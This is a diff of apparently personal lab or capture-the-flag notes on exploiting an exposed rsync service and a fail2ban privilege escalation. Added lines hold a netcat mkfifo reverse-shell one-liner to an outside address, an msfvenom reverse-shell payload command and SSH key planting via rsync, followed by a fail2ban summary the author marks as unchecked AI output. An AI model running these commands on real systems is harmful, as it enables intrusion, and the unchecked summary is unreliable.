@@ -73,12 +73,12 @@ ssh-keygen -f testkey
 cat testkey.pub > authorized_keys
 
 
-rsync -av .ssh rsync://192.168.193.126/fox
+rsync -av .ssh rsync://192.168.243.126/fox
 
 # /etc/rsyncd.secrets
 
 
-rsync -vAXogEp  ./bash rsync://192.168.193.126/fox
+rsync -vAXogEp  ./bash rsync://192.168.243.126/fox
 
 
 
@@ -174,5 +174,82 @@ theyearofthefacepalmandreadthegrouppiditisnotjustyouruser.png
 
 pain.png
 
-I would have never probably thought trying to ban mmy own ip so I need to reconfigure the way I think still on this issue. State of mind regardless 
+I would have never probably thought trying to ban my own ip so I need to reconfigure the way I think still on this issue. State of mind regardless 
 
+Used `vim` instead of `sed` and added /dev/tcp - but as I noted earlier there is no /dev/tcp... which is very weird
+testingwhatwentwrongwithmeandf2b.png
+
+But the is the old trustworthy `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.210 10000 >/tmp/f` - which is much much better than going a check whether the vulnerable version of `nc` is installed
+
+root.png
+
+Now to annihilate fail2ban with testing and learn where to nuke logs for the cheatsheet and which to protect
+
+First shell will reset with the 1 minute defaults so I tried creating persistence, but failed. 
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=873 -f elf -o fail2brain
+```
+Even with a new process it still dropped, I tried adding another r00t user because of laziness and time and that did not work. So must move forward.
+
+- Missing data
+cp: cannot create symbolic link '/media/sf_data/Fail/fox-exposed-rsync-home-dir/.bash_history': Operation not permitted
+cp: cannot create symbolic link '/media/sf_data/Fail/badRsyncIngs/MKBashPersistenceRSYNC/.bash_history': Operation not permitted
+
+
+Beyond Root
+
+fail2ban  fail till you win 
+
+[juggernaut-sec fail2ban-lpe blog ](https://juggernaut-sec.com/fail2ban-lpe/) 
+
+
+Aided by Phind
+
+Fail2Ban is a security program that is designed to prevent brute force attacks. To do this, Fail2Ban scans log files like **/var/log/auth.log** and bans IP addresses conducting too many failed login attempts. Once an offending IP address is found, Fail2Ban updates system firewall rules to reject new connections from that IP address, for a configurable amount of time. 
+
+**By default, Fail2Ban will ban an IP address for ten minutes when five authentication failures have been detected within ten minutes.**
+
+Important configuration files:
+- **fail2ban.conf** – Used to configure operational settings like how the daemon logs info, and the socket and pid file that it will use. While this file is important, it is not very interesting to us as the attacker.
+- **jail.conf** – The main configuration file, which is used to define the per-application “jails”.
+- j**ail.local** – An extension of jail.conf that is used to enable jails. Typically this is used to keep custom settings in place after updates.
+- **iptables-multiport.conf** – The action file that is responsible for setting up the firewall with a structure that allows modifications for banning malicious hosts, and for adding and removing those hosts as necessary.
+- **iptables.conf** – The “new” multiport action file used in Fail2Ban version >=1.0.1. This file exists in earlier versions, but it was not used for multiport config.
+
+```bash
+# Copy default configuration to then modify fail2ban.local and overide service configuration priority to now prioritize fail2ban.local  
+cp /etc/fail2ban/fail2ban.conf /etc/fail2ban/fail2ban.local
+```
+Modifiable values
+- `loglevel`: The level of detail that Fail2ban’s logs provide can be set to 1 (error), 2 (warn), 3 (info), or 4 (debug).
+- `logtarget`: Logs actions into a specific file. The default value of `/var/log/fail2ban.log` puts all logging into the defined file. Alternately, you can change the value to:
+    - `STDOUT`: output any data
+    - `STDERR`: output any errors
+    - `SYSLOG`: message-based logging
+    - `FILE`: output to a file
+- `socket`: The location of the socket file.
+- `pidfile`: The location of the PID file.
+
+ALL PHIND - rewrite check and consider
+
+
+
+Fail2Ban is a log-parsing application that monitors system logs for symptoms of an automated attack. It can be configured to protect any service that uses log files and can be subject to a compromise. However, there are some limitations when it comes to isolating VPN traffic with conditional rules [linode](https://www.linode.com/docs/guides/using-fail2ban-to-secure-your-server-a-tutorial/).
+
+1. **Limited to Services with Log Files**: Fail2Ban primarily works by monitoring log files for signs of malicious activity - [linode](https://www.linode.com/docs/guides/using-fail2ban-to-secure-your-server-a-tutorial/).
+
+2. **Relies on Regular Expressions**: Limited by the complexity of the regular expressions used and if regular expressions are not properly configured, Fail2Ban may fail to detect certain types of attacks [linode](https://www.linode.com/docs/guides/using-fail2ban-to-secure-your-server-a-tutorial/).
+
+3. **No Direct Control Over VPN Traffic**: Fail2Ban does not have direct control over VPN traffic. It can only monitor the logs of the VPN service and ban IP addresses based on those logs. [linode](https://www.linode.com/docs/guides/using-fail2ban-to-secure-your-server-a-tutorial/).
+
+4. **Limited to IP-Based Bans**: Fail2Ban bans IP addresses based on the number of failed login attempts. This means that it cannot differentiate between different users on the same IP address. If multiple users are sharing the same IP address, a ban on one user could potentially block all of them [4](https://www.howtogeek.com/675010/how-to-secure-your-linux-computer-with-fail2ban/).
+
+5. **No Encryption**: Fail2Ban does not provide encryption for the data it sends and receives. This means that if the network is not already encrypted, the data could be intercepted by an attacker. This is a limitation of Fail2Ban itself and not something that can be resolved by the configuration of Fail2Ban [4](https://www.howtogeek.com/675010/how-to-secure-your-linux-computer-with-fail2ban/).
+
+
+
+As a Privilege Escalation Vector
+
+Preventable with read only configuration files and root only control over the service to prevent restart 
+
+Could be a useful last chance honey pot if attack has no way to spawn a shell to migrate too and therefore requires a reverse shell, which you could then monitor for changes to log and drop the jump box call back. Good for an initial breach honey pot one time use maybe.  
